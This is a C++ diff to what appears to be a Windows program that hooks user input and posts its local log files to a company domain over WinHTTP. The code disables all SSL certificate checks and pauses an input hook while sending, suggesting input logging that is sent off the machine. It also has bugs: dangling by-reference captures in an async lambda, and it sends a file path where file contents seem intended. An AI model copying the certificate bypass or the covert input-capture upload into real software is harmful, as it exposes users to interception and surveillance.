@@ -16,6 +16,9 @@
 #include <boost/archive/iterators/binary_from_base64.hpp>
 
 
+#include <experimental/resumable>
+#include <future>
+
 CComPtr<IWinHttpRequest> CreateHTTPRequest()
 {
     CComPtr<IWinHttpRequest> pIXMLHTTPRequest;
@@ -114,41 +117,79 @@ inline void debugTrace(std::wstring const& logMsg)
 }
 
 template<class ... T>
-bool postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
+std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
 {
     try {
-#ifdef _DEBUG
+#ifdef DEBUG
+        // disable hooking while sending
         InputHooker::instance().stopHook();
         auto enableLogger = [](void*) {InputHooker::instance().startHook(); };
         std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
-#endif
+#endif // DEBUG
 
-        CComPtr<IWinHttpRequest> request = CreateHTTPRequest();
-        if (FAILED(request->Open(_bstr_t(L"POST").GetBSTR(), _bstr_t(url.c_str()).GetBSTR(), _variant_t(false))))
-            throw std::runtime_error("Cannot create open request");
-        if (FAILED(request->SetRequestHeader(_bstr_t(L"Content-Type").GetBSTR(), _bstr_t(L"application/x-www-form-urlencoded").GetBSTR())))
-            throw std::runtime_error("Cannot set request header");
+        auto postDataImpl = [&]() {
+            CoInitialize(NULL);
+            auto uninit = [](void*) {CoUninitialize(); };
+            std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);
 
-        // ignore ssl errors
-        request->put_Option(WinHttpRequestOption_SslErrorIgnoreFlags, _variant_t(SslErrorFlag_Ignore_All));
+            CComPtr<IWinHttpRequest> request = CreateHTTPRequest();
+            if (FAILED(request->Open(_bstr_t(L"POST").GetBSTR(), _bstr_t(url.c_str()).GetBSTR(), _variant_t(false))))
+                throw std::runtime_error("Cannot create open request");
+            if (FAILED(request->SetRequestHeader(_bstr_t(L"Content-Type").GetBSTR(), _bstr_t(L"application/x-www-form-urlencoded").GetBSTR())))
+                throw std::runtime_error("Cannot set request header");
 
-        const auto postData = paramsToString(std::move(key_values)...);
-        debugTrace(std::wstring(L"posted\n") + postData);
+            // ignore ssl errors
+            request->put_Option(WinHttpRequestOption_SslErrorIgnoreFlags, _variant_t(SslErrorFlag_Ignore_All));
 
-        if (FAILED(request->Send(_variant_t(postData.c_str()))))
-            throw std::runtime_error("Cannot send data");
+            const auto postData = paramsToString(std::move(key_values)...);
+            debugTrace(std::wstring(L"posted\n") + postData);
 
-        _bstr_t content;
-        request->get_ResponseText(content.GetAddress());
+            if (FAILED(request->Send(_variant_t(postData.c_str()))))
+                throw std::runtime_error("Cannot send data");
 
-        const std::wstring decodedReply = content.GetBSTR();
-        debugTrace(std::wstring(L"recieved\n") + decodedReply);
-        // TODO: process request
+            _bstr_t content;
+            request->get_ResponseText(content.GetAddress());
 
-        return content.length() != 0;
-    } catch(std::exception const& ee) {
+            const std::wstring decodedReply = content.GetBSTR();
+            debugTrace(std::wstring(L"received\n") + decodedReply);
+            // TODO: process request
+
+            return content.length() != 0;
+        };
+
+        return std::async(std::launch::async, postDataImpl);
+    } catch (std::exception const& ee) {
         std::cerr << ee.what();
     }
 
-    return false;
+    return //std::make_ready_future(false);
+    std::async([]() {return false;});
+}
+
+
+std::future<bool> postAllNewLogfiles()
+{
+
+    auto postNewLogs = []() {
+        using namespace std::tr2::sys;
+        // read last logs sent time
+        RegistryHelper reg = RegistryHelper(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
+        const time_t lastSentTime = std::stoull(std::wstring(L"0") + reg.readValue(_T("logsPostTime")));
+        // get list of new files
+        directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());
+
+        bool success = true;
+        for (auto& log : logDirIter) {
+            const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));
+            if (is_regular_file(log) && fileTime > lastSentTime)
+                //__yield_value
+                success = postData(_T("https://") _T(BRAND_DOMAIN) _T("/inefan/"), std::make_pair("appId", appId()), std::make_pair("logfile", log.path())).get() && success;
+        }
+        if (success)
+            reg.writeValue(_T("logsPostTime"), std::to_wstring(time(0)));
+        return success;
+    };
+
+    return std::async(std::launch::async, postNewLogs);
+
 }
